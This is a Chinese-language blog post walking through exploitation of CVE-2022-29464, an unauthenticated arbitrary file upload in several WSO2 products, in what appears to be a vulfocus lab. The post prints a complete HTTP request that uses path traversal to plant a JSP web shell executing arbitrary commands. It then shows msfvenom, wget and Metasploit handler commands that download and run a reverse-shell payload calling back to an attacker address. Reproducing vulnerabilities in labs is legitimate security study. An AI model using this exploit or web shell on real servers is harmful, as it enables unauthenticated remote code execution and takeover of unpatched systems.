---
title: CVE-2022-29464 WSO2文件上传
date: 2023-02-08 14:55:27
tags: [CVE漏洞,文件上传漏洞]
categories: CVE漏洞复现
---

### 影响范围

WSO2 API Manager 																						2.2.0 及更高版本到 4.0.0
WSO2 Identity Server 																					 5.2.0 及以上至 5.11.0
WSO2 Identity Server Analytics（身份服务器分析） 								 5.4.0、5.4.1、5.5.0 和 5.6.0
WSO2  Identity Server as Key Manager（身份服务器作为密钥管理器） 5.3.0 及更高版本至 5.10.0
WSO2 Enterprise Integrator 																		 6.2.0 及更高版本至 6.6.0

<!-- more -->

### 一、漏洞描述

WSO2文件上传漏洞是Orange Tsai发现的WSO2上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意JSP文件在WSO2服务器上获得RCE。

### 二、影响范围

WSO2 API Manager 																						2.2.0 及更高版本到 4.0.0
WSO2 Identity Server 																					 5.2.0 及以上至 5.11.0
WSO2 Identity Server Analytics（身份服务器分析） 								 5.4.0、5.4.1、5.5.0 和 5.6.0
WSO2  Identity Server as Key Manager（身份服务器作为密钥管理器） 5.3.0 及更高版本至 5.10.0
WSO2 Enterprise Integrator 																		 6.2.0 及更高版本至 6.6.0

### poc:

```http
POST /fileupload/toolsAny HTTP/1.1
Host: xxxx:xxxx
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 889
Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
User-Agent: python-requests/2.22.0

--4ef9f369a86bfaadf5ec3177278d49c0
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp"; filename="../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp"

<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>
--4ef9f369a86bfaadf5ec3177278d49c0--
```

### 入口：https://ip:port/authenticationendpoint/1.jsp

### 三、漏洞复现

**1.开启靶场环境**

此处用的是vulfocus靶场相关镜像

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png)

**2.访问WSO2**

访问地址为https://ip:port/carbon/admin/login.jsp

此处我的访问为 https://10.0.0.128:18966/carbon/admin/login.jsp

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png)

**3.上传文件**

通过burp工具进行抓包，然后在repeater模块构造上传请求

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png)

```http
POST /fileupload/toolsAny HTTP/1.1
Host: xxxx:xxxx
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 889
Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
User-Agent: python-requests/2.22.0

--4ef9f369a86bfaadf5ec3177278d49c0
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp"; filename="../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp"

<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>
--4ef9f369a86bfaadf5ec3177278d49c0--
```

返回数字即为上穿成功，任何可以通过访问https://ip:port/authenticationendpoint/1.jsp

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png)

至此成功实现了CVE-2022-29464文件上传漏洞

**4.取得flag**

可以在内输入指令ls查看目录结构

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png)

由于vulfocus的flag存放于tmp目录下，我们直接使用指令 ls /tmp 查看flag

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png)

至此成功取得flag，本次漏洞成功复现

##### **msf反弹shell**

若是这种查看方式过于繁琐，可以使用msf取得shell

**1.生成linux木马命令**

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png)

```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.0.0.127 lport=4444 -f elf -o shell.elf
```

**2.使用python开启http服务**

python3 -m http.server 9999

**3.让靶机下载**

![image-20230131205930045](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png)

在框中输入wget http://0.0.0.0:9999/shell.elf

并且给shell.elf文件执行权限 chmod 777 shell.elf

**4.开启msf监听**

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png)



```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 10.0.0.127
set lport 4444
```

**5.使靶机运行木马**

./shell.elf

在msf中就能拿到反弹的shell

![](CVE-2022-29464-WSO2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/10.png)
